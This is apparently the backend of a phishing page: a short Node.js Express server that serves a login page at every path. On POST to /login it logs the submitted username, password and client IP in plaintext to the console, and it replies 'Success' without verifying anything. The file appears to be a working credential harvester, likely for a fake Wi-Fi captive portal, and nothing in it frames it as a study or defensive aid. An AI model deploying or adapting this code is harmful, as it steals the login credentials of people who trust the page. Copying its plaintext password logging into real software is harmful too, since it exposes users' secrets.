// grab the packages we need
var express = require('express');
var app = express();
var port = process.env.PORT || 8080;

var bodyParser = require('body-parser');
app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

app.use(express.static(__dirname +'/public'))
// routes will go here
app.get('*',(req,res)=>{
    res.sendFile(__dirname + '/public/login.html')
})

app.post('/login',(req,res)=>{
    console.log("user: "+ req.body.auth_user)
    console.log("pass "+ req.body.auth_pass)
    var remoteAddress = req.connection.remoteAddress.split(":")
    ip = remoteAddress[remoteAddress.length-1]
    res.end("Success")
    console.log("ip: " + ip)
})
// start the server

app.listen(port);
console.log('Server started! At http://localhost:' + port);